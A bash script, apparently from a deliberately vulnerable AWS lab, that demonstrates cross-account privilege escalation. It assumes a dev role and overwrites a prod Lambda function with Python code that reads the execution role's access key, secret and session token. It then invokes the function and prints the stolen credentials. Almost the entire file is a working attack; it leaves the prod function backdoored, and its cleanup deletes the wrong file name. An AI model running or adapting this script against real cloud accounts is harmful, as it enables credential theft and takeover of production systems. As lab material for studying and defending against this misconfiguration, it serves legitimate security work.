#!/bin/bash

# Cross-Account Lambda Function Code Update Attack Demo
# This script demonstrates how a dev role can update and invoke a prod Lambda function
# to extract credentials from the Lambda execution role

set -e

echo "🚀 Starting Cross-Account Lambda Attack Demo"
echo "=============================================="

# Check if AWS CLI is configured
if ! command -v aws &> /dev/null; then
    echo "❌ AWS CLI is not installed or not in PATH"
    exit 1
fi

# Check if we have the required profile
if ! aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev &> /dev/null; then
    echo "❌ AWS profile 'pl-pathfinding-starting-user-dev' not found"
    echo "Please run: ./create_pathfinding_profiles.sh"
    exit 1
fi

echo "✅ AWS CLI and profile configured"

# Step 1: Assume the dev Lambda invoke role
echo ""
echo "📋 Step 1: Assuming dev Lambda invoke role..."
DEV_ROLE_ARN=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
DEV_ROLE_ARN="arn:aws:iam::${DEV_ROLE_ARN}:role/pl-dev-lambda-invoke-role"

echo "Assuming role: $DEV_ROLE_ARN"

# Get temporary credentials for the dev role
TEMP_CREDS=$(aws sts assume-role \
    --profile pl-pathfinding-starting-user-dev \
    --role-arn "$DEV_ROLE_ARN" \
    --role-session-name "lambda-attack-demo" \
    --output json)

if [ $? -ne 0 ]; then
    echo "❌ Failed to assume dev role"
    exit 1
fi

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION="us-west-2"

echo "✅ Successfully assumed dev Lambda invoke role"

# Step 2: Get the prod Lambda function ARN using admin cleanup profile
echo ""
echo "📋 Step 2: Getting prod Lambda function ARN..."
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-admin-cleanup-prod --query 'Account' --output text)
LAMBDA_FUNCTION_NAME=$(aws lambda list-functions --profile pl-admin-cleanup-prod --query "Functions[?starts_with(FunctionName, 'pl-prod-hello-world-')].FunctionName" --output text | head -1)

if [ -z "$LAMBDA_FUNCTION_NAME" ]; then
    echo "❌ Could not find prod Lambda function"
    exit 1
fi

# Construct the full ARN for cross-account access
LAMBDA_FUNCTION_ARN="arn:aws:lambda:us-west-2:${PROD_ACCOUNT_ID}:function:${LAMBDA_FUNCTION_NAME}"
echo "Found function: $LAMBDA_FUNCTION_NAME"
echo "Full ARN: $LAMBDA_FUNCTION_ARN"

# Step 3: Create malicious code zip
echo ""
echo "📋 Step 3: Creating malicious Lambda code..."
MALICIOUS_ZIP="/tmp/malicious_lambda.zip"

# Create malicious code with the same filename as original
cat > /tmp/hello_world.py << 'EOF'
import boto3
import json
import urllib3
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that extracts credentials and sends them to attacker
    """
    
    # Get the Lambda execution role credentials
    session = boto3.Session()
    credentials = session.get_credentials()
    
    # Extract credential information
    cred_data = {
        'access_key_id': credentials.access_key,
        'secret_access_key': credentials.secret_key,
        'session_token': credentials.token,
        'region': session.region_name,
        'function_name': context.function_name,
        'function_arn': context.invoked_function_arn,
        'account_id': context.invoked_function_arn.split(':')[4]
    }
    
    # In a real attack, this would send to attacker's server
    # For demo purposes, we'll just return the credentials
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Credentials extracted successfully',
            'credentials': cred_data,
            'warning': 'This is a demonstration of credential extraction via Lambda function code update'
        })
    }
EOF

# Create zip file
cd /tmp
zip -q malicious_lambda.zip hello_world.py
echo "✅ Created malicious Lambda code"

# Step 4: Update the Lambda function code
echo ""
echo "📋 Step 4: Updating prod Lambda function with malicious code..."
echo "Target function: $LAMBDA_FUNCTION_NAME"
echo "Using ARN: $LAMBDA_FUNCTION_ARN"

# Update the function code using the full ARN
aws lambda update-function-code \
    --function-name "$LAMBDA_FUNCTION_ARN" \
    --zip-file "fileb://malicious_lambda.zip"

if [ $? -eq 0 ]; then
    echo "✅ Successfully updated Lambda function with malicious code"
else
    echo "❌ Failed to update Lambda function"
    exit 1
fi

# Step 5: Invoke the malicious function
echo ""
echo "📋 Step 5: Invoking malicious Lambda function to extract credentials..."

RESPONSE=$(aws lambda invoke \
    --function-name "$LAMBDA_FUNCTION_ARN" \
    --payload '{}' \
    /tmp/lambda_response.json)

if [ $? -eq 0 ]; then
    echo "✅ Successfully invoked malicious Lambda function"
    echo ""
    echo "🔓 EXTRACTED CREDENTIALS:"
    echo "========================"
    cat /tmp/lambda_response.json | jq -r '.body' | jq .
else
    echo "❌ Failed to invoke Lambda function"
    exit 1
fi

# Step 6: Demonstrate the impact
echo ""
echo "📋 Step 6: Demonstrating the impact..."
echo "The extracted credentials can now be used to:"
echo "- Access any AWS service in the prod account"
echo "- Assume any role the Lambda execution role can assume"
echo "- Perform administrative actions in the prod account"
echo ""
echo "⚠️  This demonstrates a critical cross-account privilege escalation vulnerability!"

# Cleanup
echo ""
echo "🧹 Cleaning up temporary files..."
rm -f /tmp/malicious_lambda.py /tmp/malicious_lambda.zip /tmp/lambda_response.json

echo ""
echo "✅ Attack demonstration completed successfully!"
echo "The prod Lambda function now contains malicious code that can extract credentials."
